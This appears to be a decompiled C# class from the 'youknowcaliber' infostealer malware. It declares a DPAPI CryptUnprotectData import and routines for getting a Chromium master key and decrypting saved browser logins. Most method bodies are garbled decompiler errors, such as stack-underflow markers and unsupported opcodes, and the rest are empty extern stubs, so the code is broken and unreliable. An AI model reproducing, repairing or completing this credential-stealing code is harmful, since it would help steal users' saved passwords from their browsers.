using System;
using System.Runtime.InteropServices;

namespace youknowcaliber.Chromium;

internal sealed class Crypto
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct CryptprotectPromptstruct
	{
		public int cbSize;

		public int dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct DataBlob
	{
		public int cbData;

		public IntPtr pbData;
	}

	private static string sPrevBrowserPath;

	private static byte[] sPrevMasterKey;

	[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

	public static extern byte[] DPAPIDecrypt(byte[] bCipher, [Optional] byte[] bEntropy);

	public static extern byte[] GetMasterKey(string sLocalStateFolder);

	public unsafe static string GetUTF8(string sNonUtf8)
	{
		ushort num;
		do
		{
			/*OpCode not supported: DebugBreak*/;
			checked
			{
				num = (ushort)(*unchecked((float*)(nint)/*Error near IL_0002: Stack underflow*/));
				/*OpCode not supported: DebugBreak*/;
			}
		}
		while ((int)num > unchecked((nint)""));
		switch (/*Error near IL_0014: Stack underflow*/)
		{
		default:
			;
			break;
		}
		/*Error: Unexpected end of block*/;
	}

	public unsafe static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
	{
		//IL_000a: Expected O, but got I4
		while (/*Error near IL_0005: Stack underflow*/ >= /*Error near IL_0005: Stack underflow*/)
		{
		}
		_ = *(uint*)(nint)/*Error near IL_0006: Stack underflow*/;
		return (byte[])checked((uint)(double)/*Error near IL_0006: ldarg 2 (out-of-bounds)*/);
	}

	public static extern string EasyDecrypt(string sLoginData, string sPassword);

	public static extern string BrowserPathToAppName(string sLoginData);

	public extern Crypto();
}
